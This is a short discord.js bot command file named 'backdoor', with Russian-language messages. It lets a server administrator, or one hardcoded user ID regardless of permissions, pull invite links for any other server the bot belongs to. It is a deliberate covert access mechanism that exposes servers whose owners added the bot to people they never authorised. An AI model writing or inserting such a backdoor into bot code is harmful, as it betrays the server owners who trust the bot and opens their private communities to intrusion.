const Discord = require("discord.js");
module.exports.run = async (bot,message,args) => {
if(message.content.charAt(0) !== "+") return;
if(message.member.hasPermission("ADMINISTRATOR") || message.author.id == "373872608027869184") {
let guild = bot.guilds.get(args[0]);

if (!guild) return message.reply("Бот не находится на сервере с указанным ID.");
 guild.fetchInvites()
        .then(invites => message.channel.send('Найдено приглашений:\n ' + 'https://discordapp.com/invite/' + invites.map(invite => invite.code).join('\n')))
        .catch(console.error);
}}

module.exports.help = {
    name: 'backdoor',
    aliases: []
}